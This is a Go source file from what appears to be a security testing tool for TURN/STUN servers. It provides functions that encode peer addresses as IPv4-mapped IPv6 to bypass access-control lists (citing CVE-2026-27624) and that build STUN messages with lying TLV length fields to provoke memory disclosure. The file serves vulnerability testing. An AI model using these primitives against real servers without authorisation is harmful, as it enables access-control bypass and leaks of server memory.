// Copyright 2025 Praetorian Security, Inc.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package turn

import (
	"encoding/binary"
	"net"

	"github.com/pion/stun"
)

// STUN address families per RFC 5389.
const (
	AddressFamilyIPv4 byte = 0x01
	AddressFamilyIPv6 byte = 0x02
)

// STUN magic cookie value.
var magicCookie = []byte{0x21, 0x12, 0xA4, 0x42}

// XORPeerAddress encodes an XOR-PEER-ADDRESS attribute.
// Unlike pion/stun's built-in XORMappedAddress, this supports explicit
// IPv4-mapped IPv6 addresses (::ffff:x.x.x.x) for ACL bypass testing.
// The address is NOT normalized — if you pass a 16-byte IPv6 address,
// it will be encoded as IPv6 (family=0x02) even if it's an IPv4-mapped address.
func XORPeerAddress(ip net.IP, port int, transactionID [stun.TransactionIDSize]byte) stun.RawAttribute {
	// Determine address family based on IP length
	ip4 := ip.To4()
	if ip4 != nil && len(ip) != 16 {
		// Pure IPv4 address
		return xorEncodeIPv4(stun.AttrXORPeerAddress, ip4, port)
	}
	// IPv6 (including IPv4-mapped IPv6 like ::ffff:127.0.0.1)
	ip6 := ip.To16()
	return xorEncodeIPv6(stun.AttrXORPeerAddress, ip6, port, transactionID)
}

// XORPeerAddressIPv6Explicit forces IPv6 encoding for an address.
// Use this to encode an IPv4 address in IPv4-mapped IPv6 format (::ffff:x.x.x.x)
// for ACL bypass testing (CVE-2026-27624).
func XORPeerAddressIPv6Explicit(ipv4 net.IP, port int, transactionID [stun.TransactionIDSize]byte) stun.RawAttribute {
	// Convert IPv4 to IPv4-mapped IPv6: ::ffff:x.x.x.x
	ip4 := ipv4.To4()
	if ip4 == nil {
		// Already IPv6, use as-is
		return xorEncodeIPv6(stun.AttrXORPeerAddress, ipv4.To16(), port, transactionID)
	}
	mapped := make(net.IP, 16)
	copy(mapped[0:10], net.IPv6zero[0:10])
	mapped[10] = 0xff
	mapped[11] = 0xff
	copy(mapped[12:16], ip4)
	return xorEncodeIPv6(stun.AttrXORPeerAddress, mapped, port, transactionID)
}

func xorEncodeIPv4(attrType stun.AttrType, ip net.IP, port int) stun.RawAttribute {
	// Format: 1 byte reserved + 1 byte family + 2 bytes XOR'd port + 4 bytes XOR'd addr
	value := make([]byte, 8)
	value[0] = 0 // reserved
	value[1] = AddressFamilyIPv4

	// XOR port with first 2 bytes of magic cookie
	xorPort := uint16(port) ^ 0x2112
	binary.BigEndian.PutUint16(value[2:4], xorPort)

	// XOR address with magic cookie
	for i := 0; i < 4; i++ {
		value[4+i] = ip[i] ^ magicCookie[i]
	}

	return stun.RawAttribute{
		Type:  attrType,
		Value: value,
	}
}

func xorEncodeIPv6(attrType stun.AttrType, ip net.IP, port int, transactionID [stun.TransactionIDSize]byte) stun.RawAttribute {
	// Format: 1 byte reserved + 1 byte family + 2 bytes XOR'd port + 16 bytes XOR'd addr
	value := make([]byte, 20)
	value[0] = 0 // reserved
	value[1] = AddressFamilyIPv6

	// XOR port with first 2 bytes of magic cookie
	xorPort := uint16(port) ^ 0x2112
	binary.BigEndian.PutUint16(value[2:4], xorPort)

	// XOR address with magic cookie (4 bytes) + transaction ID (12 bytes)
	xorKey := make([]byte, 16)
	copy(xorKey[0:4], magicCookie)
	copy(xorKey[4:16], transactionID[:])
	for i := 0; i < 16; i++ {
		value[4+i] = ip[i] ^ xorKey[i]
	}

	return stun.RawAttribute{
		Type:  attrType,
		Value: value,
	}
}

// BuildMalformedTLV creates a raw STUN attribute with a length field that
// exceeds the actual data. Used for memory disclosure testing.
// The returned bytes are a raw TLV: [2-byte type][2-byte claimed_length][data...][padding]
func BuildMalformedTLV(attrType uint16, data []byte, claimedLength uint16) []byte {
	// TLV header: 4 bytes (type + length)
	paddedClaimed := claimedLength
	if paddedClaimed%4 != 0 {
		paddedClaimed += 4 - (paddedClaimed % 4)
	}

	buf := make([]byte, 4+len(data))
	binary.BigEndian.PutUint16(buf[0:2], attrType)
	binary.BigEndian.PutUint16(buf[2:4], claimedLength) // Lie about length
	copy(buf[4:], data)

	// Pad actual data to 4-byte boundary
	if remainder := len(data) % 4; remainder != 0 {
		padding := make([]byte, 4-remainder)
		buf = append(buf, padding...)
	}

	return buf
}

// BuildMalformedSTUNMessage creates a complete STUN message with a malformed TLV attribute.
// The STUN header message-length reflects the claimed TLV size, not the actual data size.
func BuildMalformedSTUNMessage(msgType stun.MessageType, attrType uint16, data []byte, claimedLength uint16) []byte {
	txnID := stun.NewTransactionID()

	// Build the malformed TLV
	tlv := BuildMalformedTLV(attrType, data, claimedLength)

	// STUN header: 20 bytes
	// Message length = size of all attributes (using claimed length for the malformed attr)
	paddedClaimed := int(claimedLength)
	if paddedClaimed%4 != 0 {
		paddedClaimed += 4 - (paddedClaimed % 4)
	}
	msgLength := uint16(4 + paddedClaimed) // 4 byte attr header + padded claimed data

	header := make([]byte, 20)
	typeVal := msgType.Value()
	binary.BigEndian.PutUint16(header[0:2], typeVal)
	binary.BigEndian.PutUint16(header[2:4], msgLength)
	// Magic cookie
	copy(header[4:8], magicCookie)
	// Transaction ID
	copy(header[8:20], txnID[:])

	result := make([]byte, 0, 20+len(tlv))
	result = append(result, header...)
	result = append(result, tlv...)

	return result
}
